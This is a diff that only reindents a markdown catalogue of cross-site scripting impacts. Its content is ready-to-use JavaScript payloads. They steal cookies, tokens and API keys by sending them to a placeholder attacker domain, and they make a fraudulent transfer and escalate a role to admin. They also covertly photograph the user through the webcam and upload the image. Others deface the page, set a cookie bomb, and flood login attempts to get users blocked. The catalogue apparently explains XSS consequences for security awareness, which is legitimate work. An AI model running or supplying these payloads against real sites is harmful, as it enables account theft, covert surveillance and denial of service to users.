@@ -13,25 +13,25 @@
 ### Credentials used for authentication (e.g., cookie, access token) can be stolen.
 
 - Cookie stealing
-   ```html
+    ```html
     <script>
         fetch(`https://[ATTACKER-DOMAIN]/?cookie=${document.cookie}`)
     </script>
-   ```
+    ```
 - token stealing
     ```html
     <script>
         fetch(`https://[ATTACKER-DOMAIN]/?token=${localStorage.getItem("token")}`)
     </script>
-   ```
+    ```
 - API key stealing
     ```html
     <script>
         fetch('/myinfo')
-        .then(response => response.json())
-        .then(data => {
-            return fetch(`https://[ATTACKER-DOMAIN]/?api_key=${data.api_key}`)
-        })
+            .then(response => response.json())
+            .then(data => {
+                return fetch(`https://[ATTACKER-DOMAIN]/?api_key=${data.api_key}`)
+            })
     </script>
     ```
 
@@ -42,19 +42,19 @@
 - Making a transfer
     ```html
     <script>
-        initiateTransaction("attacker_account",1000)
+        initiateTransaction("attacker_account", 1000)
     </script>
-   ```
+    ```
 
 - Privilege escalation
     ```html
     <script>
-    fetch('https://[ATTACKER-DOMAIN]/change-role', {
-        method: 'POST',
-        body: "user_id=1234&role=admin"
-    })
+        fetch('https://[ATTACKER-DOMAIN]/change-role', {
+            method: 'POST',
+            body: "user_id=1234&role=admin"
+        })
     </script>
-   ```
+    ```
 
 ## WEB API abusing
 
@@ -63,32 +63,37 @@
 - Camera access
     ```html
     <script>
-    document.addEventListener('DOMContentLoaded', async () => {
-        const v = document.createElement('video');
-        v.autoplay = true;
-        v.style.display = 'none';
-        document.body.appendChild(v);
+        document.addEventListener('DOMContentLoaded', async () => {
+            const v = document.createElement('video');
+            v.autoplay = true;
+            v.style.display = 'none';
+            document.body.appendChild(v);
 
-        const c = document.createElement('canvas');
-        c.style.display = 'none';
-        document.body.appendChild(c);
+            const c = document.createElement('canvas');
+            c.style.display = 'none';
+            document.body.appendChild(c);
 
-        const s = await navigator.mediaDevices.getUserMedia({ video: true });
-        v.srcObject = s;
+            const s = await navigator.mediaDevices.getUserMedia({
+                video: true
+            });
+            v.srcObject = s;
 
-        setTimeout(() => {
-        const ctx = c.getContext('2d');
-        c.width = v.videoWidth;
-        c.height = v.videoHeight;
-        ctx.drawImage(v, 0, 0);
+            setTimeout(() => {
+                const ctx = c.getContext('2d');
+                c.width = v.videoWidth;
+                c.height = v.videoHeight;
+                ctx.drawImage(v, 0, 0);
 
-        c.toBlob(b => {
-            const f = new FormData();
-            f.append('image', b, 'photo.png');
-            fetch('https://[ATTACKER-DOMAIN]/images', { method: 'POST', body: f });
-        }, 'image/png');
-        }, 1000);
-    });
+                c.toBlob(b => {
+                    const f = new FormData();
+                    f.append('image', b, 'photo.png');
+                    fetch('https://[ATTACKER-DOMAIN]/images', {
+                        method: 'POST',
+                        body: f
+                    });
+                }, 'image/png');
+            }, 1000);
+        });
     </script>
     ```
 
@@ -97,16 +102,15 @@
 ### Elements of the page can be modified through DOM manipulation.
 
 - Defacement
-
-   ```html
-   <script>
-   document.body.innerHTML = `
-     <div style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:black; display:flex; align-items:center; justify-content:center; color:red; font-size:3em; font-family:sans-serif; z-index:10000;">
-       You've been hacked
-     </div>
-   `;
-   </script>
-   ```
+    ```html
+    <script>
+    document.body.innerHTML = `
+        <div style="position:fixed; top:0; left:0; width:100%; height:100%; background-color:black; display:flex; align-items:center; justify-content:center; color:red; font-size:3em; font-family:sans-serif; z-index:10000;">
+        You've been hacked
+        </div>
+    `;
+    </script>
+    ```
 
 ## Data Exfiltration
 
@@ -124,22 +128,24 @@
 - Cookie Bomb
     ```html
     <script>
-    for(let i = 0; i < 100; i++) {
-        document.cookie = `bomb${i}=${Array(1000).join('A')}`;
-    }
+        for (let i = 0; i < 100; i++) {
+            document.cookie = `bomb${i}=${Array(1000).join('A')}`;
+        }
     </script>
     ```
 
 - IP blocking through rapid login attempts
     ```html
     <script>
-    // Rate limiting or threshold-based blocking can be triggered, causing legitimate users to be temporarily or permanently blocked
-    for (let i = 0; i < 1000; i++) {
-        fetch('/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `username=user&password=pass${i}`
-        });
-    }
+        // Rate limiting or threshold-based blocking can be triggered, causing legitimate users to be temporarily or permanently blocked
+        for (let i = 0; i < 1000; i++) {
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: `username=user&password=pass${i}`
+            });
+        }
     </script>
     ```
